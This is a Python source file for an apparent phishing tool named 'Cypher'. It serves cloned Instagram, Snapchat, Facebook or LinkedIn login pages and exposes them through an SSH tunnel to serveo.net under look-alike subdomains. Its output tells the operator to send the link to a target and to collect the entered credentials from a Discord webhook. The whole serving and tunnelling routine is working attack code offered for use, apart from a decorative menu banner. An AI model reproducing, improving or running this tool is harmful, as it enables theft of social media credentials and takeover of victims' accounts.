from pyfiglet import Figlet
from termcolor import colored
import colorama
import random
import os
import http.server
import socketserver
import subprocess
import webbrowser
import time

# Initialize colorama for Windows
colorama.init()

def serve_website(platform):
    # Define the directory to serve based on platform
    if platform.lower() == 'instagram':
        directory = 'web/instagram'
        subdomain = 'instagram-login'
    elif platform.lower() == 'snapchat':
        directory = 'web/snapchat'
        subdomain = 'snapchat-login'
    elif platform.lower() == 'facebook':
        directory = 'web/facebook'
        subdomain = 'facebook-login'
    elif platform.lower() == 'linkedin':
        directory = 'web/linkedin'
        subdomain = 'linkedin-login'
    else:
        print("Invalid platform selected")
        return

    # Change to the selected platform directory
    os.chdir(directory)
    
    print(f"\nStarting {platform} phishing page...")
    print("Initializing serveo.net tunnel...")
    
    try:
        # Start a simple HTTP server in the background
        PORT = 8000
        Handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", PORT), Handler)
        
        # Start the server in a separate process
        import threading
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        # Create SSH tunnel to serveo.net with specific subdomain
        tunnel_command = f"ssh -o ServerAliveInterval=60 -R {subdomain}:80:localhost:{PORT} serveo.net"
        
        # Use different command for Windows
        if os.name == 'nt':
            # For Windows, assuming OpenSSH is installed
            process = subprocess.Popen(tunnel_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        else:
            # For Linux/Mac
            process = subprocess.Popen(tunnel_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        
        print("\nEstablishing secure connection...")
        time.sleep(2)
        
        # Monitor the output for the forwarding URL
        while True:
            line = process.stdout.readline()
            if "Forwarding HTTP traffic from" in line:
                url = f"https://{subdomain}.serveo.net"
                print(f"\n[+] Your phishing link is ready: {url}")
                print("[+] Send this link to your target")
                print("[+] Waiting for target to enter credentials...")
                print("[+] Check your Discord webhook for incoming credentials")
                print("\n[Press Ctrl+C to stop the server]")
                break
            elif "Warning:" in line or "Error:" in line:
                print(f"\nError: {line}")
                print("Try changing the subdomain name or check your internet connection")
                httpd.shutdown()
                process.terminate()
                os.chdir("../../")
                return
            
        # Keep the server running until user interrupts
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping server...")
            httpd.shutdown()
            process.terminate()
            os.chdir("../../")  # Return to original directory
            
    except Exception as e:
        print(f"\nError: {str(e)}")
        print("Make sure you have SSH installed and serveo.net is accessible")
        print("Try these steps:")
        print("1. Install OpenSSH if not installed")
        print("2. Check your internet connection")
        print("3. Try a different subdomain name")
        print("4. Make sure port 80 is not blocked by firewall")
        os.chdir("../../")  # Return to original directory

def print_menu():
    # Create a Figlet object with a different font style
    figlet = Figlet(font='slant')

    # Text to display
    text = "Cypher"

    # Generate the ASCII art
    ascii_art = figlet.renderText(text)

    # Colors for rainbow effect
    colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']

    # Get the width and height of the ASCII art
    ascii_lines = ascii_art.split('\n')
    max_width = max(len(line) for line in ascii_lines)
    height = len(ascii_lines)

    # Create decorative frame with proper width
    frame_width = max_width + 8
    frame_width = frame_width + (frame_width % 2)  # Make sure width is even
    top_border = colored('╔' + '═' * (frame_width-2) + '╗', 'cyan')
    bottom_border = colored('╚' + '═' * (frame_width-2) + '╝', 'cyan')
    empty_line = colored('║' + ' ' * (frame_width-2) + '║', 'cyan')

    # Create decorative top and bottom bars with proper width
    top_decoration = '█' + '▀' * (frame_width-4) + '█'
    bottom_decoration = '█' + '▄' * (frame_width-4) + '█'

    # Build the final output with background
    final_art = [
        top_border,
        colored('║' + top_decoration + '║', 'cyan'),
        empty_line
    ]

    # Add the rainbow text with centered alignment
    color_index = 0
    for line in ascii_lines:
        if line.strip():
            # Center the line properly
            padding = (frame_width - 2 - len(line)) // 2
            colored_line = colored(line, colors[color_index % len(colors)])
            # Ensure even padding on both sides
            right_padding = frame_width - 2 - padding - len(line)
            final_line = colored('║', 'cyan') + ' ' * padding + colored_line + ' ' * right_padding + colored('║', 'cyan')
            final_art.append(final_line)
            color_index += 1
        else:
            final_art.append(empty_line)

    # Add menu options
    menu_options = [
        "[ Select your target ]",
        "",
        "[1] Instagram",
        "[2] Snapchat",
        "[3] Facebook",
        "[4] LinkedIn",
        "[5] Exit",
        "",
        "Enter your choice: "
    ]

    # Add menu options with proper centering
    for option in menu_options[:-1]:  # Don't add the input prompt to the frame
        padding = (frame_width - 2 - len(option)) // 2
        final_line = colored('║', 'cyan') + ' ' * padding + colored(option, 'white') + ' ' * (frame_width - 2 - padding - len(option)) + colored('║', 'cyan')
        final_art.append(final_line)

    # Add bottom decorative elements
    final_art.extend([
        empty_line,
        colored('║' + bottom_decoration + '║', 'cyan'),
        bottom_border
    ])

    # Add matrix-style side decorations
    side_dec_left = [
        colored('░▒▓█', 'green') + ' ',
        colored('▓▒░█', 'green') + ' ',
        colored('░▒▓█', 'green') + ' '
    ]

    side_dec_right = [
        ' ' + colored('█▓▒░', 'green'),
        ' ' + colored('█░▒▓', 'green'),
        ' ' + colored('█▓▒░', 'green')
    ]

    # Print the final composition with side decorations
    for i, line in enumerate(final_art):
        if i > 0 and i < len(final_art) - 1:  # Don't add side decorations to top and bottom borders
            left_dec = side_dec_left[i % len(side_dec_left)]
            right_dec = side_dec_right[i % len(side_dec_right)]
            print(left_dec + line + right_dec)
        else:
            print(line)

    # Add bottom matrix rain effect
    matrix_bottom = ''.join(colored('▀▄'[(i+random.randint(0,1))%2], 'green') for i in range(frame_width))
    print(' ' * 4 + matrix_bottom)
    
    # Print the input prompt outside the frame
    return input(colored(menu_options[-1], 'white'))

def main():
    while True:
        choice = print_menu()
        if choice == '1':
            serve_website('instagram')
        elif choice == '2':
            serve_website('snapchat')
        elif choice == '3':
            serve_website('facebook')
        elif choice == '4':
            serve_website('linkedin')
        elif choice == '5':
            print("\nExiting...")
            break
        else:
            print("\nInvalid choice! Press Enter to continue...")
            input()
        
        # Clear screen for Windows
        os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    main() 